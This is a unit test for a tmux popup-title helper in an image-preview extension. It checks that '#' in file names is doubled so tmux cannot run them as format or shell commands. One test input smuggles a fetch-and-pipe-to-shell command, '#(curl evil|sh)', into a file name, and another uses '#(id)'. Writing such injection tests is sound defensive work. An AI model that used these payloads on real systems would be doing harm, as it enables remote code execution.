// /preview's popup title is a tmux format: an unescaped #(...) in a file name
// runs as a shell command when tmux draws it.

import assert from "node:assert/strict";
import test from "node:test";
import { popupTitle } from "../extensions/image-preview/index.ts";

test("the popup title doubles # so tmux shows a file name instead of running it", () => {
	assert.equal(popupTitle("/shots/plain.png"), " plain.png ");
	assert.equal(popupTitle("/repo/#(curl evil|sh).png"), " ##(curl evil|sh).png ");
	assert.equal(popupTitle("/a/#{pane_id}#[fg=red].png"), " ##{pane_id}##[fg=red].png ");
	assert.doesNotMatch(popupTitle("/x/#(id)#(id).png").replace(/##/g, ""), /#/, "no single # left");
});
